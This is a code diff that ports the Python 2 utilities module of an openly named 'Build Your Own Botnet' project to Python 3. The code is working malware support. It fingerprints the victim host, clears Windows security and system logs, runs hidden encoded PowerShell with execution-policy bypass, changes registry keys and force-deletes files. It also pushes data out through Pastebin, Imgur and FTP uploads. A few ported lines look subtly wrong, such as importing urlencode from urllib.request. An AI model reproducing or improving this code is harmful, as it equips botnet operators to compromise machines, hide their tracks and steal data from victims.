@@ -2,28 +2,31 @@
 # -*- coding: utf-8 -*-
 'Utilities (Build Your Own Botnet)'
 
+import colorama
+colorama.init()
+
 _debug = False
 
 # main
 def log(info, level='debug'):
-    """ 
+    """
     Log output to the console (if verbose output is enabled)
 
     """
     import logging
-    logging.basicConfig(level=logging.DEBUG if globals()['_debug'] else logging.ERROR, handler=logging.StreamHandler())
+    logging.basicConfig(level=logging.DEBUG if globals()['_debug'] else logging.ERROR, handlers=[logging.StreamHandler()])
     logger = logging.getLogger(__name__)
     getattr(logger, level if hasattr(logger, level) else 'debug')(str(info))
 
 def imports(source, target=None):
-    """ 
+    """
     Attempt to import each package into the module specified
 
     `Required`
     :param list source: package/module to import
 
     `Optional`
-    :param object target: target object/module to import into 
+    :param object target: target object/module to import into
 
     """
     if isinstance(source, str):
@@ -41,7 +44,7 @@ def imports(source, target=None):
             log("missing package '{}' is required".format(source))
 
 def is_compatible(platforms=['win32','linux2','darwin'], module=None):
-    """ 
+    """
     Verify that a module is compatible with the host platform
 
     `Optional`
@@ -56,7 +59,7 @@ def is_compatible(platforms=['win32','linux2','darwin'], module=None):
     return False
 
 def platform():
-    """ 
+    """
     Return the system platform of host machine
 
     """
@@ -64,15 +67,19 @@ def platform():
     return sys.platform
 
 def public_ip():
-    """ 
+    """
     Return public IP address of host machine
 
     """
-    import urllib
-    return urllib.urlopen('http://api.ipify.org').read()
+    import sys
+    if sys.version_info[0] > 2:
+        from urllib.request import urlopen
+    else:
+        from urllib import urlopen
+    return urlopen('http://api.ipify.org').read()
 
 def local_ip():
-    """ 
+    """
     Return local IP address of host machine
 
     """
@@ -80,7 +87,7 @@ def local_ip():
     return socket.gethostbyname(socket.gethostname())
 
 def mac_address():
-    """ 
+    """
     Return MAC address of host machine
 
     """
@@ -88,7 +95,7 @@ def mac_address():
     return ':'.join(hex(uuid.getnode()).strip('0x').strip('L')[i:i+2] for i in range(0,11,2)).upper()
 
 def architecture():
-    """ 
+    """
     Check if host machine has 32-bit or 64-bit processor architecture
 
     """
@@ -96,7 +103,7 @@ def architecture():
     return int(struct.calcsize('P') * 8)
 
 def device():
-    """ 
+    """
     Return the name of the host machine
 
     """
@@ -104,7 +111,7 @@ def device():
     return socket.getfqdn(socket.gethostname())
 
 def username():
-    """ 
+    """
     Return username of current logged in user
 
     """
@@ -112,7 +119,7 @@ def username():
     return os.getenv('USER', os.getenv('USERNAME', 'user'))
 
 def administrator():
-    """ 
+    """
     Return True if current user is administrator, otherwise False
 
     """
@@ -121,7 +128,7 @@ def administrator():
     return bool(ctypes.windll.shell32.IsUserAnAdmin() if os.name == 'nt' else os.getuid() == 0)
 
 def ipv4(address):
-    """ 
+    """
     Check if valid IPv4 address
 
     `Required`
@@ -133,12 +140,12 @@ def ipv4(address):
     import socket
     try:
         if socket.inet_aton(str(address)):
-           return True
+            return True
     except:
         return False
 
 def status(timestamp):
-    """ 
+    """
     Check the status of a job/thread
 
     `Required`
@@ -153,8 +160,22 @@ def status(timestamp):
           '{} seconds'.format(int(c % 60.0)) if int(c % 60.0) else str()]
     return ', '.join([i for i in data if i])
 
+def unzip(filename):
+    """
+    Extract all files from a ZIP archive
+
+    `Required`
+    :param str filename:     path to ZIP archive
+
+    """
+    import os
+    import zipfile
+    z = zipfile.ZipFile(filename)
+    path = os.path.dirname(filename)
+    z.extractall(path=path)
+
 def post(url, headers={}, data={}, json={}, as_json=False):
-    """ 
+    """
     Make a HTTP post request and return response
 
     `Required`
@@ -177,22 +198,26 @@ def post(url, headers={}, data={}, json={}, as_json=False):
             except: pass
         return output
     except ImportError:
-        import urllib
-        import urllib2
-        data = urllib.urlencode(data)
-        req  = urllib2.Request(str(url), data=data)
+        import sys
+        if sys.version_info[0] > 2:
+            from urllib.request import urlopen,urlencode,Request
+        else:
+            from urllib import urlencode
+            from urllib2 import urlopen,Request
+        data = urlencode(data)
+        req  = Request(str(url), data=data)
         for key, value in headers.items():
             req.headers[key] = value
-        output = urllib2.urlopen(req).read()
+        output = urlopen(req).read()
         if as_json:
             import json
             try:
                 output = json.loads(output)
             except: pass
         return output
-    
+
 def normalize(source):
-    """ 
+    """
     Normalize data/text/stream
 
     `Required`
@@ -212,7 +237,7 @@ def normalize(source):
         return bytes(source)
 
 def registry_key(key, subkey, value):
-    """ 
+    """
     Create a new Windows Registry Key in HKEY_CURRENT_USER
 
     `Required`
@@ -234,7 +259,7 @@ def registry_key(key, subkey, value):
         return False
 
 def png(image):
-    """ 
+    """
     Transforms raw image data into a valid PNG data
 
     `Required`
@@ -246,7 +271,12 @@ def png(image):
     import zlib
     import numpy
     import struct
-    import StringIO
+
+    try:
+        from StringIO import StringIO  # Python 2
+    except ImportError:
+        from io import StringIO        # Python 3
+
     if isinstance(image, numpy.ndarray):
         width, height = (image.shape[1], image.shape[0])
         data = image.tobytes()
@@ -255,21 +285,26 @@ def png(image):
         data = image.rgb
     else:
         raise TypeError("invalid input type: {}".format(type(image)))
+
     line = width * 3
     png_filter = struct.pack('>B', 0)
     scanlines = b"".join([png_filter + data[y * line:y * line + line] for y in range(height)])
     magic = struct.pack('>8B', 137, 80, 78, 71, 13, 10, 26, 10)
+
     ihdr = [b"", b'IHDR', b"", b""]
     ihdr[2] = struct.pack('>2I5B', width, height, 8, 2, 0, 0, 0)
     ihdr[3] = struct.pack('>I', zlib.crc32(b"".join(ihdr[1:3])) & 0xffffffff)
     ihdr[0] = struct.pack('>I', len(ihdr[2]))
+
     idat = [b"", b'IDAT', zlib.compress(scanlines), b""]
     idat[3] = struct.pack('>I', zlib.crc32(b"".join(idat[1:3])) & 0xffffffff)
     idat[0] = struct.pack('>I', len(idat[2]))
+
     iend = [b"", b'IEND', b"", b""]
     iend[3] = struct.pack('>I', zlib.crc32(iend[1]) & 0xffffffff)
     iend[0] = struct.pack('>I', len(iend[2]))
-    fileh = StringIO.StringIO()
+
+    fileh = StringIO()
     fileh.write(magic)
     fileh.write(b"".join(ihdr))
     fileh.write(b"".join(idat))
@@ -278,7 +313,7 @@ def png(image):
     return fileh.getvalue()
 
 def delete(target):
-    """ 
+    """
     Tries to delete file via multiple methods, if necessary
 
     `Required`
@@ -286,6 +321,7 @@ def delete(target):
 
     """
     import os
+    import shutil
     try:
         _ = os.popen('attrib -h -r -s {}'.format(target)) if os.name == 'nt' else os.chmod(target, 777)
     except OSError: pass
@@ -298,7 +334,7 @@ def delete(target):
     except OSError: pass
 
 def clear_system_logs():
-    """ 
+    """
     Clear Windows system logs (Application, security, Setup, System)
 
     """
@@ -311,7 +347,7 @@ def clear_system_logs():
         log(e)
 
 def kwargs(data):
-    """ 
+    """
     Takes a string as input and returns a dictionary of keyword arguments
 
     `Required`
@@ -326,7 +362,7 @@ def kwargs(data):
         log(e)
 
 def powershell(code):
-    """ 
+    """
     Execute code in Powershell.exe and return any results
 
     `Required`
@@ -341,10 +377,10 @@ def powershell(code):
         powershell = r'C:\Windows\System32\WindowsPowershell\v1.0\powershell.exe' if os.path.exists(r'C:\Windows\System32\WindowsPowershell\v1.0\powershell.exe') else os.popen('where powershell').read().rstrip()
         return os.popen('{} -exec bypass -window hidden -noni -nop -encoded {}'.format(powershell, base64.b64encode(code))).read()
     except Exception as e:
-        log("{} error: {}".format(powershell.func_name, str(e)))
+        log("{} error: {}".format(powershell.__name__, str(e)))
 
 def display(output, color=None, style=None, end='\n', event=None, lock=None):
-    """ 
+    """
     Display output in the console
 
     `Required`
@@ -353,24 +389,25 @@ def display(output, color=None, style=None, end='\n', event=None, lock=None):
     `Optional`
     :param str color:     red, green, cyan, magenta, blue, white
     :param str style:     normal, bright, dim
-    :param str end:       __future__.print_function keyword arg                                                       
+    :param str end:       __future__.print_function keyword arg
     :param lock:          threading.Lock object
     :param event:         threading.Event object
- 
+
     """
-    import colorama
-    colorama.init()
-    output = str(output)
+    if isinstance(output, bytes):
+        output = output.decode('utf-8')
+    else:
+        output = str(output)
     _color = ''
     if color:
         _color = getattr(colorama.Fore, color.upper())
     _style = ''
     if style:
         _style = getattr(colorama.Style, style.upper())
-    exec("print(_color + _style + output){}".format(end))
+    exec("""print(_color + _style + output + colorama.Style.RESET_ALL, end="{}")""".format(end))
 
 def color():
-    """ 
+    """
     Returns a random color for use in console display
 
     """
@@ -378,11 +415,11 @@ def color():
         import random
         return random.choice(['BLACK', 'BLUE', 'CYAN', 'GREEN', 'LIGHTBLACK_EX', 'LIGHTBLUE_EX', 'LIGHTCYAN_EX', 'LIGHTGREEN_EX', 'LIGHTMAGENTA_EX', 'LIGHTRED_EX', 'LIGHTWHITE_EX', 'LIGHTYELLOW_EX', 'MAGENTA', 'RED', 'RESET', 'WHITE', 'YELLOW'])
     except Exception as e:
-        log("{} error: {}".format(color.func_name, str(e)))
+        log("{} error: {}".format(color.__name__, str(e)))
 
 def imgur(source, api_key=None):
-    """ 
-    Upload image file/data to Imgur 
+    """
+    Upload image file/data to Imgur
 
     """
     import base64
@@ -393,7 +430,7 @@ def imgur(source, api_key=None):
         log("No Imgur API key found")
 
 def pastebin(source, api_key):
-    """ 
+    """
     Upload file/data to Pastebin
 
     `Required`
@@ -404,20 +441,29 @@ def pastebin(source, api_key):
     :param str api_user_key:   Pastebin api_user_key
 
     """
-    import urllib2
+    import sys
+    if sys.version_info[0] > 2:
+        from urllib.parse import urlsplit,urlunsplit
+    else:
+        from urllib2 import urlparse
+        urlsplit = urlparse.urlsplit
+        urlunsplit = urlparse.urlunsplit
     if isinstance(api_key, str):
         try:
             info = {'api_option': 'paste', 'api_paste_code': normalize(source), 'api_dev_key': api_key}
             paste = post('https://pastebin.com/api/api_post.php', data=info)
-            parts = urllib2.urlparse.urlsplit(paste)       
-            return urllib2.urlparse.urlunsplit((parts.scheme, parts.netloc, '/raw' + parts.path, parts.query, parts.fragment)) if paste.startswith('http') else paste
+            parts = urlsplit(paste)
+            result = urlunsplit((parts.scheme, parts.netloc, '/raw' + parts.path, parts.query, parts.fragment)) if paste.startswith('http') else paste
+            if not result.endswith('/'):
+                result += '/'
+            return result
         except Exception as e:
             log("Upload to Pastebin failed with error: {}".format(e))
     else:
         log("No Pastebin API key found")
 
 def ftp(source, host=None, user=None, password=None, filetype=None):
-    """ 
+    """
     Upload file/data to FTP server
 
     `Required`
@@ -433,7 +479,12 @@ def ftp(source, host=None, user=None, password=None, filetype=None):
     import os
     import time
     import ftplib
-    import StringIO
+
+    try:
+        from StringIO import StringIO  # Python 2
+    except ImportError:
+        from io import StringIO        # Python 3
+
     if host and user and password:
         path  = ''
         local = time.ctime().split()
@@ -443,7 +494,7 @@ def ftp(source, host=None, user=None, password=None, filetype=None):
         elif hasattr(source, 'seek'):
             source.seek(0)
         else:
-            source = StringIO.StringIO(source)
+            source = StringIO(source)
         try:
             ftp = ftplib.FTP(host=host, user=user, password=password)
         except:
@@ -464,7 +515,7 @@ def ftp(source, host=None, user=None, password=None, filetype=None):
         log('missing one or more required arguments: host, user, password')
 
 def config(*arg, **options):
-    """ 
+    """
     Configuration decorator for adding attributes (e.g. declare platforms attribute with list of compatible platforms)
 
     """
@@ -479,7 +530,7 @@ def config(*arg, **options):
     return _config
 
 def threaded(function):
-    """ 
+    """
     Decorator for making a function threaded
 
     `Required`
@@ -496,4 +547,3 @@ def threaded(function):
         t.start()
         return t
     return _threaded
-  
